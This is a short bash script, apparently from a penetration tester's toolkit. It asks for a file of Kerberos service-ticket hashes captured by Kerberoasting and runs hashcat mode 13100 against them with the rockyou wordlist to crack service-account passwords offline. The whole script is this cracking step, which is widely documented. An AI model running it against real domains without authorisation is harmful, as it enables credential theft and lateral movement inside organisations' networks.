#!/bin/bash
# Syntax -- hashcat -m 13100 -a 0 <challenge.txt> /usr/share/wordlists/rockyou.txt

# This is a script that is used if you successfuly kerberoast a user. 
# When you run this script, it will prompt for the challenge/hash file and will attempt to crack the hash with hashcat



echo "What is the challenge/hash file? " 
read challenge 

hashcat -m 13100 -a 0 $challenge /usr/share/wordlists/rockyou.txt 
